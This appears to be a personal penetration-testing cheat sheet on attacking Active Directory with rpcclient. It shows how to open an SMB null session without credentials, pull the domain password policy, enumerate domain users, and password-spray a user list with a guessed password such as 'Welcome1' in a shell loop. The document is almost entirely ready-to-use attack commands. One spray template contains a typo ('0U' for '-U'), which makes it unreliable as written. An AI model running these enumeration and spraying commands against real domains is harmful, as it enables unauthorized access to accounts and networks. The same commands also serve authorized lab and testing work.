-- -
Can be used outside of an AD context, but will generally be used in an AD context.
#### Enumerate Password Policy w/o valid credentials
Uses SMB null session to achieve this.
```bash
# Establish a NULL SMB session
rpcclient -U "" -N <ip> 
rpcclient -U "" -N 172.16.5.5

# Confirm NULL session Access
rpcclient $> querydominfo

# query Password Policy
rpcclient $> getdompwinfo
```

^c2a0e3
#### Enumerating valid users w/o credentials
```bash
# Connect to a NULL session
rpcclient -U "" -N <ip>

# query domain users
rpcclient $> enumdomusers
```

^0efe93

#### Password Spray
```bash
for u in $(cat <userlist>.txt);do rpcclient 0U "$u%<passwd>" -c "getusername;quit" dc ip | grep Authority; done

for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

^c36a7d
